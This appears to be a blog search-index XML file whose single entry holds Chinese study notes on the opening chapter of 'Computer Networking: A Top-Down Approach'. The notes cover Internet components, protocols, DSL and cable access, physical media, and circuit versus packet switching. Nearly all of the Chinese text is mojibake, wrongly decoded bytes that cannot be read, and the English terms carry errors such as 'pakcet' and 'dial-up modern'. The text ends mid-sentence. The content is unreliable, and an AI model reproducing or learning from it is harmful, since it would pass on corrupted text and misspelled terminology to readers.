<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Computer Networking A Top-Down Approach]]></title>
    <url>%2F2020%2F07%2F16%2FComputer-Networking-A-Top-Down-Approach%2F</url>
    <content type="text"><![CDATA[åœ¨å¼€å§‹ä»»ä½•æ—…è¡Œä¹‹å‰,æˆ‘ä»¬é¦–å…ˆè¦æŸ¥çœ‹è·¯çº¿å›¾,ä»¥ä¾¿æ›´ç†Ÿæ‚‰å‰é¢çš„ä¸»è¦é“è·¯å’Œäº¤ç•Œå¤„,å¯¹äºŽæˆ‘ä»¬ç€æ‰‹ä»Žäº‹çš„è¿™ä¸ªtravel,æœ€ç»ˆç›®çš„æ˜¯æ·±å…¥ç†è§£æœ‰å…³è®¡ç®—æœºç½‘ç»œçš„æ€Žä¹ˆ,ä»€ä¹ˆå’Œä¸ºä»€ä¹ˆ.æˆ‘ä»¬çš„è·¯çº¿å›¾æ˜¯æœ¬ä¹¦å„ç« é¡ºåº.(æœ¬ç§‘å»ºè®®å‰5ç« ).BRIEF! è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘ åº”ç”¨å±‚ è¿è¾“å±‚ ç½‘ç»œå±‚ é“¾è·¯å±‚ä¸Žå±€åŸŸç½‘ æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œ å¤šåª’ä½“ç½‘ç»œ è®¡ç®—æœºç½‘ç»œä¸­çš„å®‰å…¨ ç½‘ç»œç®¡ç† 1.1ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘å› ç‰¹ç½‘éžå¸¸å¤æ‚,å¹¶ä¸”åœ¨ä¸æ–­å˜åŒ–,æ— è®ºæ˜¯å¯¹ç¡¬ä»¶å’Œè½¯ä»¶ç»„ä»¶,è¿˜æ˜¯å¯¹å®ƒæ‰€æä¾›çš„æœåŠ¡è€Œè¨€éƒ½æ˜¯å¦‚æ­¤.æè¿°å› ç‰¹ç½‘çš„ä¸¤ç§æ–¹æ³•.ä¸€ç§æ˜¯æè¿°å› ç‰¹ç½‘çš„å…·ä½“æž„æˆ,å³æž„æˆå› ç‰¹ç½‘çš„åŸºæœ¬ç¡¬ä»¶å’Œè½¯ä»¶ç»„ä»¶.å¦ä¸€ç§æ–¹æ³•æ˜¯æ ¹æ®ä¸ºåˆ†å¸ƒå¼åº”ç”¨æä¾›æœåŠ¡çš„ç½‘ç»œåŸºç¡€è®¾æ–½æ¥æè¿°å› ç‰¹ç½‘. 1.1.1å…·ä½“æž„æˆæè¿°è®¸å¤šéžä¼ ç»Ÿè®¾å¤‡è¢«è”å‘å› ç‰¹ç½‘çš„æƒ…å†µä¸‹,Computer Networkingæœ‰ç‚¹è¿‡æ—¶äº†.å‡†ç¡®æ¥è¯´æ‰€æœ‰è¿™äº›è®¾å¤‡éƒ½åº”è¯¥è¢«ç§°ä¸ºä¸»æœº(host)/ç«¯ç³»ç»Ÿ(end system). ç«¯ç³»ç»Ÿé€šè¿‡é€šä¿¡é“¾è·¯(communication link)å’Œåˆ†ç»„äº¤æ¢æœº(packer switch)è¿žæŽ¥åˆ°ä¸€èµ·,ä¸åŒç±»åž‹çš„é€šä¿¡é“¾è·¯ç”±ä¸åŒçš„ç‰©ç†åª’ä½“ç»„æˆ,è¿™äº›ç‰©ç†åª’ä½“åŒ…æ‹¬åŒè½´çº¿ç¼†,é“œçº¿,å…‰çº¤å’Œæ— çº¿ç”µé¢‘è°±.ä¸åŒçš„é“¾è·¯ä»¥ä¸åŒçš„é€ŸçŽ‡ä¼ è¾“æ•°æ®,é“¾è·¯çš„ä¼ è¾“é€ŸçŽ‡æ˜¯ä»¥bpsåº¦é‡çš„.å½“ä¸€å°ç«¯ç³»ç»Ÿè¦å‘å¦ä¸€å°ç«¯ç³»ç»Ÿå‘é€æ—¶,å‘é€ç«¯ç³»ç»Ÿå°†æ•°æ®åˆ†æ®µ,å¹¶ä¸ºæ¯æ®µåŠ ä¸Šé¦–éƒ¨å­—èŠ‚.å½¢æˆçš„ä¿¡æ¯åŒ…è¢«ç§°ä¸ºåˆ†ç»„(pakcet). åˆ†ç»„äº¤æ¢æœºä»Žä»–çš„ä¸€æ¡å…¥é€šä¿¡é“¾è·¯æŽ¥æ”¶åˆ°è¾¾çš„åˆ†ç»„,å¹¶ä»Žå®ƒçš„ä¸€æ¡å‡ºé€šä¿¡é“¾è·¯è½¬å‘è¯¥åˆ†ç»„.å¸‚é¢ä¸Šæµè¡Œç€å„ç§ä¸åŒç±»åž‹ä¸”å„å…·ç‰¹è‰²çš„åˆ†ç»„äº¤æ¢æœº,ä½†æ˜¯æœ€è‘—åçš„æ˜¯è·¯ç”±å™¨(router)å’Œé“¾è·¯å±‚äº¤æ¢æœº(link-layer switch).è¿™ä¸¤ç§ç±»åž‹çš„äº¤æ¢æœºæœç€æœ€ç»ˆç›®çš„åœ°è½¬å‘åˆ†ç»„.ä¸€ä¸ªåˆ†ç»„æ‰€ç»åŽ†çš„ä¸€ç³»åˆ—é€šä¿¡é“¾è·¯å’Œåˆ†ç»„äº¤æ¢æœºç§°ä¸ºé€šè¿‡è¯¥ç½‘ç»œçš„è·¯å¾„(routeæˆ–path). ç«¯ç³»ç»Ÿé€šè¿‡å› ç‰¹ç½‘æœåŠ¡æä¾›å•†ISP(Internet Service Provider)æŽ¥å…¥å› ç‰¹ç½‘.æ¯ä¸€ä¸ªISPæ˜¯ä¸€ä¸ªç”±å¤šä¸ªåˆ†ç»„äº¤æ¢æœºå’Œå¤šæ®µé€šä¿¡é“¾è·¯ç»„æˆçš„ç½‘ç»œ,ä¸åŒISPä¸ºç«¯ç³»ç»Ÿæä¾›äº†å„ç§ä¸åŒç±»åž‹çš„æŽ¥å…¥.é«˜å±‚ISPæ˜¯ç”±é€šè¿‡é«˜é€Ÿå…‰çº¤é“¾è·¯äº’è”çš„é«˜é€Ÿè·¯ç”±å™¨æž„æˆçš„.æ— è®ºæ˜¯é«˜å±‚è¿˜æ˜¯åº•å±‚ISPç½‘ç»œ,éƒ½æ˜¯ç‹¬ç«‹ç®¡ç†çš„,è¿è¡ŒIPåè®®,éµä»Žä¸€å®šçš„å‘½åå’Œåœ°å€ä¹ æƒ¯. ç«¯ç³»ç»Ÿ,åˆ†ç»„äº¤æ¢æœºå’Œå…¶ä»–å› ç‰¹ç½‘éƒ¨ä»¶,éƒ½è¦è¿è¡ŒæŽ§åˆ¶å› ç‰¹ç½‘ç§ä¿¡æ¯æŽ¥æ”¶å’Œå‘é€çš„ä¸€ç³»åˆ—protocol.TCP(Transmission Control Protocol,ä¼ è¾“æŽ§åˆ¶åè®®)å’ŒIP(Internet Protocol,ç½‘é™…åè®®)æ˜¯å› ç‰¹ç½‘ä¸­æœ€é‡è¦çš„ä¸¤ä¸ªåè®®. å› ç‰¹ç½‘æ ‡å‡†(Internet standard)ç”±å› ç‰¹ç½‘å·¥ç¨‹ä»»åŠ¡ç»„(Internet Engineering Task Force,IETF).å…¶æ ‡å‡†æ–‡æ¡£è¢«ç§°ä¸ºè¯·æ±‚è¯„è®º(Request For Comment,RFC). å…¬å…±å› ç‰¹ç½‘è¢«ç‰¹æŒ‡ä¸ºinternet,è¿˜æœ‰è®¸å¤šä¸èƒ½ä¸Žä¸“ç”¨ç½‘ç»œå¤–éƒ¨çš„ä¸»æœºäº¤æ¢ä¿¡æ¯çš„ç½‘ç»œ,å¦‚æ”¿åºœä¸Žå…¬å¸çš„ç½‘ç»œ,è¢«ç§°ä¸ºå†…è”ç½‘(intranet).å› ä¸ºå®ƒä»¬ä¸Žå…¬å…±å› ç‰¹ç½‘é‡‡ç”¨åŒæ ·ç±»åž‹çš„ä¸»æœº,è·¯ç”±å™¨,é“¾è·¯å’Œåè®®. 1.1.2æœåŠ¡æè¿°ä»Žä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡çš„åŸºç¡€è®¾æ–½çš„è§’åº¦æ¥æè¿°å› ç‰¹ç½‘,åˆ™å¦‚email,web,å¯¹ç­‰æ–‡ä»¶å…±äº«(peer-to-peer)ç­‰æ¶‰åŠå¤šå°ç›¸äº’äº¤æ¢æ•°æ®ç«¯ç³»ç»Ÿçš„åº”ç”¨ç¨‹åºè¢«ç§°ä¸ºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åº(distribution applicationtern). ä¸Žå› ç‰¹ç½‘ç›¸è¿žçš„ç«¯ç³»ç»Ÿæä¾›äº†ä¸€ä¸ªåº”ç”¨ç¨‹åºç¼–ç¨‹æŽ¥å£(Application Programming Interface),APIè§„å®šäº†è¿è¡Œåœ¨ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„è½¯ä»¶è¯·æ±‚å› ç‰¹ç½‘åŸºç¡€è®¾æ–½å‘è¿è¡Œåœ¨å¦ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„ç‰¹å®šç›®çš„çš„è½¯ä»¶äº¤ä»˜æ•°æ®çš„æ–¹å¼. 1.1.3ä»€ä¹ˆæ˜¯åè®® ä¸€ä¸ªåè®®å®šä¹‰äº†åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªé€šä¿¡å®žä½“ä¹‹é—´äº¤æ¢çš„æŠ¥æ–‡æ ¼å¼å’Œæ¬¡åº,ä»¥åŠåœ¨æŠ¥æ–‡ä¼ è¾“å’Œ/æˆ–æŽ¥æ”¶æˆ–å…¶ä»–äº‹ä»¶æ–¹é¢æ‰€é‡‡å–çš„åŠ¨ä½œ. 1.2ç½‘ç»œè¾¹ç¼˜ç«¯ç³»ç»Ÿend systemå› å…¶å¤„åœ¨internetçš„è¾¹ç¼˜è€Œè¢«ç§°ä½œç«¯ç³»ç»Ÿ,ä¹Ÿå› å…¶å®¹çº³åº”ç”¨ç¨‹åºè€Œè¢«ç§°ä¸ºä¸»æœº.ä¸»æœºè¢«åˆ†ä¸ºä¸¤ç±»:å®¢æˆ·æœºclientå’ŒæœåŠ¡å™¨server. 1.2.1å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ç¨‹åºå®¢æˆ·æœºç¨‹åºclient programæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„ç¨‹åº,ä»–å‘å‡ºè¯·æ±‚,å¹¶ä»Žè¿è¡Œåœ¨å¦ä¸€ä¸ªç«¯ç³»ç»Ÿä¸Šçš„æœåŠ¡å™¨ç¨‹åºserver programæŽ¥æ”¶æœåŠ¡.è¿™ç§å®¢æˆ·æœº-æœåŠ¡å™¨æ¨¡å¼æ˜¯å½“å‰æœ€æµè¡Œçš„ç»“æž„. ä»Šå¤©çš„å› ç‰¹ç½‘å¹¶æœªå…¨éƒ½æ˜¯æœ‰ç”±ä¸Žçº¯æœåŠ¡å™¨äº¤äº’çš„çº¯å®¢æˆ·æœºç¨‹åºç»„æˆçš„,è¶Šæ¥è¶Šå¤šçš„åº”ç”¨ç¨‹åºæ˜¯p2påº”ç”¨ç¨‹åº,å…¶ä¸­çš„ç«¯ç³»ç»Ÿæ‰§è¡Œå®¢æˆ·æœºå’ŒæœåŠ¡å™¨åŠŸèƒ½çš„ç¨‹åº.ä¾‹å¦‚å…±äº«æ–‡ä»¶å¤¹çš„è®¿é—®ä¸Žè¢«è®¿é—®. 1.2.2æŽ¥å…¥ç½‘å³access network,å°†ç«¯ç³»ç»Ÿè¿žæŽ¥åˆ°å…¶è¾¹ç¼˜è·¯ç”±å™¨edge routerçš„ç‰©ç†é“¾è·¯.è¾¹ç¼˜è·¯ç”±å™¨æ˜¯ç«¯ç³»ç»Ÿåˆ°ä»»ä½•å…¶ä»–è¿œç¨‹ç«¯ç³»ç»Ÿçš„è·¯å¾„ä¸Šçš„ç¬¬ä¸€å°è·¯ç”±å™¨.ç½‘è·¯æŽ¥å…¥å¯å¤§æ¦‚ä¸ä¸¥æ ¼åœ°åˆ†ä¸ºä¸€ä¸‹å‡ ç§ç±»åž‹: ä½å®…æŽ¥å…¥residential access,å°†å®¶åº­ç«¯ç³»ç»Ÿä¸Žç½‘ç»œç›¸è¿ž. å…¬å¸æŽ¥å…¥company access,å°†å•†ä¸š/æ•™è‚²æœºæž„ä¸­çš„ç«¯ç³»ç»Ÿä¸Žç½‘ç»œç›¸è¿ž. æ— çº¿æŽ¥å…¥wireless access,å°†ç§»åŠ¨ç«¯ç³»ç»Ÿä¸Žç½‘ç»œç›¸è¿ž. ä½å®…æŽ¥å…¥æ˜¯æŒ‡å°†å®¶åº­ç«¯ç³»ç»Ÿä¸Žè¾¹ç¼˜è·¯ç”±å™¨ç›¸è¿ž.ä¸€ç§ä½å®…æŽ¥å…¥å½¢å¼æ˜¯é€šè¿‡æ™®é€šæ¨¡æ‹Ÿç”µè¯çº¿ç”¨æ‹¨å·è°ƒåˆ¶è°ƒè§£å™¨dial-up modernä¸Žä½å®…ISPç›¸è¿ž.å®¶ç”¨è°ƒåˆ¶è§£è°ƒå™¨å°†PCè¾“å‡ºçš„æ•°å­—ä¿¡å·è½¬æ¢ä¸ºæ¨¡æ‹Ÿå½¢å¼,ä»¥ä¾¿åœ¨æ¨¡æ‹Ÿç”µè¯çº¿ä¸Šä¼ è¾“.æ¨¡æ‹Ÿç”µè¯çº¿ç”±åŒç»žé“œçº¿æž„æˆ,å°±æ˜¯ä¸Žæ‰“æ™®é€šç”µè¯ç›¸åŒçš„ç”µè¯çº¿.åœ¨æ¨¡æ‹Ÿç”µè¯çº¿çš„å¦ä¸€ç«¯,ISPçš„è°ƒåˆ¶è§£è°ƒå™¨å†å°†æ¨¡æ‹Ÿä¿¡å·è½¬æ¢å›žæ•°å­—å½¢å¼,ä½œä¸ºISPè·¯ç”±å™¨çš„è¾“å…¥.å› æ­¤è¯¥æŽ¥å…¥ç½‘ç»œä»…æ˜¯è¿žåŒä¸€æ¡ç‚¹å¯¹ç‚¹æ‹¨å·ç”µè¯çº¿ä¸€èµ·çš„ä¸€å¯¹è°ƒåˆ¶è§£è°ƒå™¨. å®½å¸¦ä½å®…æŽ¥å…¥æœ‰ä¸¤ç§å¸¸è§ç±»åž‹:ç”¨æˆ·æ•°å­—çº¿digital subscriber line,DSLå’Œæ··åˆå…‰çº¤åŒè½´ç”µç¼†hybrid fiber-coaxial cable,HFC. DSLæŽ¥å…¥ä¸€èˆ¬æ˜¯ç”µè¯å…¬å¸æä¾›,å…¶æ¦‚å¿µç±»ä¼¼äºŽè°ƒåˆ¶è§£è°ƒå™¨,æ˜¯ä¸€ç§æ–°åž‹è°ƒåˆ¶è§£è°ƒå™¨æŠ€æœ¯,ä¹Ÿè¿è¡Œåœ¨çŽ°æœ‰çš„åŒç»žç”µè¯çº¿ä¸Š.å…¶æ•°æ®ä¼ è¾“é€ŸçŽ‡é€šå¸¸åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šæ˜¯ä¸å¯¹ç§°çš„,ä»ŽISPè·¯ç”±å™¨é“æ€¥åœçš„é€ŸçŽ‡æ¯”ä»Žå®¶åº­åˆ°ISPè·¯ç”±å™¨çš„è¦æ›´é«˜.DSLåœ¨å®¶åº­å’ŒISPä¹‹é—´å°†é€šä¿¡é“¾è·¯åˆ’åˆ†ä¸ºä¸‰ä¸ªä¸é‡å é¢‘æ®µ: é«˜é€Ÿä¸‹è¡Œä¿¡é“,50KHz~1MHzé¢‘æ®µ. ä¸­é€Ÿä¸Šè¡Œé€šé“,4kHz~50kHzé¢‘æ®µ. æ™®é€šçš„åŒå‘ç”µè¯ä¿¡é“,ä½äºŽ0~4kHzé¢‘æ®µ. è¿™ç§æ–¹æ³•ä½¿å¾—å•æ ¹DSLçº¿è·¯çœ‹èµ·æ¥åƒæ˜¯3æ¡å•ç‹¬çš„çº¿è·¯,å› æ­¤ä¸€ä¸ªç”µè¯å‘¼å«å’Œä¸€ä¸ªå› ç‰¹ç½‘è¿žæŽ¥èƒ½å¤ŸåŒæ—¶å…±äº«DSLé“¾è·¯(é¢‘åˆ†å¤šè·¯å¤ç”¨æŠ€æœ¯). è™½ç„¶DSLå’Œæ‹¨å·è°ƒåˆ¶è§£è°ƒå™¨ä½¿ç”¨æ™®é€šçš„ç”µè¯çº¿,ä½†æ˜¯HFCæŽ¥å…¥ç½‘æ‰©å±•äº†å½“å‰ç”¨äºŽå¹¿æ’­ç”µç¼†ç”µè§†çš„ç”µç¼†ç½‘ç»œ.åœ¨ä¼ ç»Ÿçš„ç”µç¼†ç³»ç»Ÿä¸­,ç”µç¼†å¤´ç«¯Head endå¹¿æ’­é€šè¿‡é€šå·žç”µç¼†å’Œæ”¾å¤§å™¨çš„åˆ†é…ç½‘ç»œä¼ å‘ä½å®….ä¸ŽDSLç±»ä¼¼,HFCéœ€è¦ç‰¹æ®Šçš„è°ƒåˆ¶è§£è°ƒå™¨ç§°ä¸ºç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨cable modern,æä¾›ç”µç¼†å› ç‰¹ç½‘æŽ¥å…¥çš„å…¬å¸é€šå¸¸è¦æ±‚ç”¨æˆ·è´­ä¹°/ç§Ÿç”¨.ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨é€šå¸¸æ˜¯ä¸€ç§å¤–éƒ¨è®¾å¤‡,é€šè¿‡ä¸€ä¸ªä»¥å¤ªç½‘ç«¯å£å’Œå®¶åº­PCç›¸è¿ž.ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨åˆ†ä¸ºä¸¤ä¸ªä¿¡é“,ä¸Šè¡Œä¿¡é“å’Œä¸‹è¡Œä¿¡é“.ä¸ŽDSLç±»ä¼¼,ä¸‹è¡Œä¿¡é“åˆ†é…æ›´å¤§çš„å¸¦å®½.HFCçš„å¦ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯å®ƒå…±äº«å¹¿æ’­åª’ä½“ 1.2.3ç‰©ç†åª’ä½“ ä¼ è¾“è¿‡ç¨‹ä¸­,å¯¹äºŽæ¯ä¸ªä¼ è¾“æŽ¥æ”¶å¯¹,é€šè¿‡è·¨è¶Šä¸€ç§ç‰©ç†åª’ä½“(physical medium)ä¼ æ’­ç”µç£æ³¢æˆ–å…‰è„‰å†²æ¥å‘é€è¯¥æ¯”ç‰¹.è¯¥ç‰©ç†åª’ä½“èƒ½å¤Ÿå…·æœ‰å¤šç§å½¢çŠ¶å’Œå½¢å¼,å¹¶å¯¹æ²¿é€”çš„æ¯ä¸ªä¼ è¾“æŽ¥æ”¶å¯¹è€Œè¨€ä¸å¿…æœ‰ç›¸åŒç±»åž‹. ç‰©ç†åª’ä½“çš„ä¾‹å­åŒ…æ‹¬åŒç»žé“œçº¿,åŒè½´ç”µç¼†,å¤šæ¨¡å…‰çº¤ç¼†,åœ°é¢æ— çº¿ç”µç¼†,åœ°é¢æ— çº¿é¢‘è°±å’Œå«æ˜Ÿæ— çº¿é¢‘è°±.ç‰©ç†åª’ä½“åˆ’åˆ†ä¸ºä¸¤ç±»:å¯¼å¼•åž‹åª’ä½“(guided media)å’Œéžå¯¼å¼•åž‹åª’ä½“(unguided media).å¯¹äºŽå¯¼å¼•åž‹åª’ä½“,ç”µæ³¢æ²¿ç€å›ºä½“åª’ä½“è¢«å¯¼å¼•,å¯¹äºŽéžå¯¼å¼•åž‹åª’ä½“,ç”µæ³¢åœ¨ç©ºæ°”æˆ–è€…å¤–å±‚ç©ºé—´ä¼ æ’­. åŒç»žé“œçº¿:æœ€ä¾¿å®œæœ€æ™®éçš„å¼•å¯¼åž‹ä¼ è¾“åª’ä½“,ä¸€ç›´ç”¨äºŽç”µè¯ç½‘.åŒç»žçº¿ç”±ä¸¤æ ¹éš”ç¦»çš„é“œçº¿ç»„æˆ,æ¯æ ¹å¤§çº¦1mm,ä»¥è§„åˆ™çš„å½¢å¼èžºæ—‹æŽ’åˆ—.è¿™ä¸¤æ ¹çº¿è¢«ç»žåˆèµ·æ¥ä»¥å‡å°‘å¯¹é‚»è¿‘åŒç»žçº¿çš„ç”µå™¨å¹²æ‰°.é€šå¸¸è®¸å¤šåŒç»žçº¿æ†æ‰Žåœ¨ä¸€èµ·å½¢æˆä¸€æ ¹ç”µç¼†,å¹¶åœ¨è¿™äº›åŒç»žçº¿å¤–é¢è¦†ç›–ä¸Šä¿æŠ¤æ€§é˜²æŠ¤å±‚.ä¸€å †ç”µçº¿æž„æˆä¸€ä¸ªé€šä¿¡é“¾è·¯.éžå±è”½åŒç»žçº¿(unshielded twisted pair,UTP)å¸¸ç”¨åœ¨å»ºç­‘ç‰©å†…çš„è®¡ç®—æœºç½‘ç»œå³å±€åŸŸç½‘LANä¸­.æ‰€èƒ½è¾¾åˆ°çš„æ•°æ®ä¼ è¾“é€ŸçŽ‡å–å†³äºŽçº¿çš„åŽšåº¦ä»¥åŠä¼ è¾“æ–¹ä¸ŽæŽ¥æ”¶æ–¹çš„è·ç¦».åŒç»žçº¿æœ€ç»ˆå·²ç»ä½œä¸ºé«˜é€ŸLANè”ç½‘çš„ä¸»è¦æ–¹å¼. åŒè½´ç”µç¼†:åŒè½´ç”µç¼†ç”±ä¸¤ä¸ªé“œå¯¼ä½“ç»„æˆ,ä½†æ˜¯è¿™ä¸¤æ ¹é“œå¯¼ä½“æ˜¯åŒå¿ƒçš„è€Œéžå¹¶è¡Œçš„,å€ŸåŠ©äºŽè¿™ç§ç»“æž„å’Œç‰¹æ®Šçš„ç»ç¼˜ä½“å’Œä¿æŠ¤å±‚,åŒè½´ç”µç¼†èƒ½å¤Ÿå…·æœ‰é«˜æ¯”ç‰¹é€ŸçŽ‡.åœ¨ç”µè§†ç³»ç»Ÿä¸­ç›¸å½“æ™®é.åŒè½´ç”µç¼†èƒ½å¤Ÿè¢«ç”¨ä½œå¼•å¯¼å¼å…±äº«åª’ä½“,è®¸å¤šç«¯ç³»ç»Ÿèƒ½å¤Ÿç›´æŽ¥ä¸Žè¯¥ç”µç¼†ç›¸è¿ž,è€Œä¸”æ‰€æœ‰çš„ç«¯ç³»ç»Ÿéƒ½èƒ½æŽ¥æ”¶ç”±å…¶ä»–ç«¯ç³»ç»Ÿå‘é€çš„ä¸œè¥¿. å…‰ç¼†:å…‰çº¤æ˜¯ä¸€ç§ç»†è€ŒæŸ”è½¯çš„èƒ½å¤Ÿå¼•å¯¼å…‰è„‰å†²çš„åª’ä½“,å…¶ä¸­æ¯ä¸€ä¸ªè„‰å†²è¡¨ç¤ºä¸€ä¸ªæ¯”ç‰¹.ä¼ è¾“é€ŸçŽ‡æžé«˜,ä¸å—ç”µç£å¹²æ‰°.å…‰è½½æ³¢(Optical Carrier)æ ‡å‡†é“¾è·¯é€ŸçŽ‡çš„èŒƒå›´ä»Ž51.8Mbpsåˆ°39.8Gbps,è¿™äº›è§„æ ¼å‚æ•°è¢«ç§°ä½œOC-n,é“¾è·¯é€ŸçŽ‡ç­‰äºŽnÃ—51.8Mbps. é™†åœ°æ— çº¿ç”µä¿¡é“:æ— çº¿ç”µä¿¡é“æ‰¿è½½ç”µç£é¢‘è°±ä¸­çš„ä¿¡å·.æ— éœ€å®‰è£…ç‰©ç†çº¿è·¯,å¹¶å…·æœ‰ç©¿é€å¢™å£,æä¾›ä¸Žç§»åŠ¨ç”¨æˆ·è¿žæŽ¥ä»¥åŠé•¿è·ç¦»æ‰¿è½½ä¿¡å·çš„èƒ½åŠ›.çŽ¯å¢ƒä¸Šè€ƒè™‘å–å†³äºŽè·¯å¾„æŸè€—å’Œé®æŒ¡è¡°è½(ä½†ä¿¡å·è·¨è¶Šè·ç¦»å’Œç»•è¿‡/é€šè¿‡é˜»ç¢ç‰©ä½“æ—¶,ä¿¡å·å¼ºåº¦é™ä½Ž),å¤šå¾„è¡°è½(ç”±äºŽå¹²æ‰°å¯¹è±¡çš„ä¿¡å·åå°„)ä»¥åŠå¹²æ‰°(å…¶ä»–æ— çº¿ç”µä¿¡é“/ç”µç£ä¿¡å·).é™†åœ°æ— çº¿ç”µä¿¡é“å¯ä»¥åˆ†ä¸ºä¸¤ç±»:è¿è¡Œåœ¨æœ¬åœ°åŒºåŸŸ,è·¨è¶Šååˆ°ç™¾ç±³;è¿è¡Œåœ¨å¹¿åŸŸ,è·¨è¶Šæ•°ä¸‡ç±³;å¹³å¸¸ç”Ÿæ´»ä¸­çš„æ— çº¿LANä½¿ç”¨äº†å±€åŸŸæ— çº¿ç”µä¿¡é“,èœ‚çªæŽ¥å…¥æŠ€æœ¯ä½¿ç”¨äº†å¹¿åŸŸæ— çº¿ç”µä¿¡é“. å«æ˜Ÿæ— çº¿ç”µé€šé“:ä¸€é¢—é€šä¿¡å«æ˜Ÿè¿žæŽ¥ä¸¤ä¸ªæˆ–è€…å¤šä¸ªä½äºŽåœ°çƒçš„å¾®æ³¢å‘å°„æ–¹/æŽ¥æ”¶æ–¹,è¢«ç§°ä¸ºåœ°é¢ç«™.è¯¥å«æ˜Ÿåœ¨ä¸€ä¸ªé¢‘æ®µä¸ŠæŽ¥æ”¶ä¼ è¾“,ä½¿ç”¨ä¸€ä¸ªè½¬å‘å™¨å†ç”Ÿä¿¡å·,å¹¶åœ¨å¦ä¸€ä¸ªé¢‘çŽ‡ä¸Šä¼ è¾“ä¿¡å·.é€šä¿¡ä¸­ä½¿ç”¨ä¸¤ç±»å«æ˜Ÿ:åŒæ­¥å«æ˜Ÿå’Œä½Žåœ°çƒè½¨é“å«æ˜Ÿ.åŒæ­¥å«æ˜Ÿæ°¸ä¹…åœç•™åœ¨åœ°çƒä¸Šæ–¹ç›¸åŒçš„ç‚¹ä¸Š,è¿™ç§é™æ­¢çš„å­˜åœ¨åé€šè¿‡å°†è¯¥å«æ˜Ÿæ”¾ç½®åœ¨åœ°çƒè¡¨é¢ä¸Šæ–¹36000kmçš„è½¨é“ä¸Šå–å¾—çš„.æ‰€ä»¥ä»Žåœ°é¢ç«™åˆ°å«æ˜Ÿå†å›žåœ°é¢ç«™å¼•å…¥äº†280msçš„æ—¶å»¶.èƒ½ä»¥æ•°ç™¾Mbpsè¿è¡Œçš„å«æ˜Ÿé“¾è·¯å¸¸ç”¨äºŽç”µè¯ç½‘/å› ç‰¹ç½‘çš„ä¸»å¹².ä½Žåœ°çƒè½¨é“å«æ˜Ÿå›´ç»•åœ°çƒæ—‹è½¬,å½¼æ­¤é€šä¿¡.ä¸ºäº†æä¾›å¯¹ä¸€ä¸ªåŒºåŸŸçš„è¿žç»­è¦†ç›–,éœ€è¦æ”¾ç½®ç›¸å½“å¤šå«æ˜Ÿ. 1.3ç½‘ç»œæ ¸å¿ƒ ç½‘ç»œæ ¸å¿ƒ:äº’è”äº†å› ç‰¹ç½‘ç«¯ç³»ç»Ÿçš„åˆ†ç»„äº¤æ¢æœºå’Œé“¾è·¯çš„ç½‘çŠ¶ç»“æž„. 1.3.1ç”µè·¯äº¤æ¢å’Œåˆ†ç»„äº¤æ¢é€šè¿‡ç½‘ç»œé“¾è·¯å’Œäº¤æ¢æœºç§»åŠ¨æ•°æ®æœ‰ä¸¤ç§åŸºæœ¬æ–¹æ³•:ç”µè·¯äº¤æ¢circuit switchingå’Œåˆ†ç»„äº¤æ¢packet switching.åœ¨ç”µè·¯äº¤æ¢ç½‘ç»œä¸­,æ²¿ç€ç«¯ç³»ç»Ÿè·¯å¾„,ä¸ºç«¯ç³»ç»Ÿä¹‹é—´é€šä¿¡æ‰€æä¾›çš„èµ„æº(ç¼“å­˜.é“¾è·¯ä¼ è¾“é€ŸçŽ‡)åœ¨é€šä¿¡ä¼šè¯æœŸé—´ä¼šè¢«é¢„ç•™.è€Œåœ¨åˆ†ç»„äº¤æ¢ä¸­,è¿™äº›èµ„æºä¸ä¼šè¢«é¢„ç•™.ä¼šè¯çš„æŠ¥æ–‡æŒ‰éœ€ä½¿ç”¨è¿™äº›èµ„æº,å¯èƒ½ä¸å¾—ä¸æŽ’é˜ŸæŽ¥å…¥é€šä¿¡çº¿è·¯.å³å‰è€…éœ€è¦é¢„å®š,ä½†æ˜¯èƒ½å¤Ÿç«‹å³ä½¿ç”¨.åŽè€…æ— éœ€é¢„å®š,ä½†æ˜¯å¯èƒ½éœ€è¦æŽ’é˜Ÿ. æ— å¤„ä¸åœ¨çš„ç”µè¯ç½‘ç»œæ˜¯ç”µè·¯äº¤æ¢ç½‘ç»œçš„ä¾‹å­.é€šè¿‡ç”µè¯ç½‘å‘å¦ä¸€ä¸ªäººå‘é€ä¿¡æ¯ä¹‹å‰,éœ€è¦å»ºç«‹è¿žæŽ¥.è¿™æ˜¯ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šçš„è¿žæŽ¥,å› ä¸ºæ­¤æ—¶æ²¿ç€å‘é€æ–¹å’ŒæŽ¥æ”¶æ–¹ä¹‹é—´çš„è·¯å¾„ä¸Šçš„äº¤æ¢æœºèƒ½å¤Ÿä¸ºè¯¥è¿žæŽ¥ç»´æŠ¤è¿žæŽ¥çŠ¶æ€.ä½†æ˜¯åœ¨é™é»˜æœŸ(slient period)èµ„æºçš„åˆ©ç”¨çŽ‡ä¼šå˜ä½Ž. å› ç‰¹ç½‘åˆ™æ˜¯åˆ†ç»„äº¤æ¢ç½‘ç»œçš„å…¸èŒƒ.å› ç‰¹ç½‘å°½åŠ›è€Œä¸ºbest effortåœ°ä»¥é€‚æ—¶åœ°æ–¹å¼ä¼ é€’åˆ†ç»„,ä½†æ˜¯ä¸åšä»»ä½•ç¡®ä¿. ç”µè·¯äº¤æ¢ç½‘ç»œ:eg:ç”¨4æ¡é“¾è·¯äº’è”4å°ç”µè·¯äº¤æ¢æœº,è¿™äº›æ‹¦è·¯åœ°æ¯æ¡éƒ½æœ‰næ¡ç”µè·¯,å› 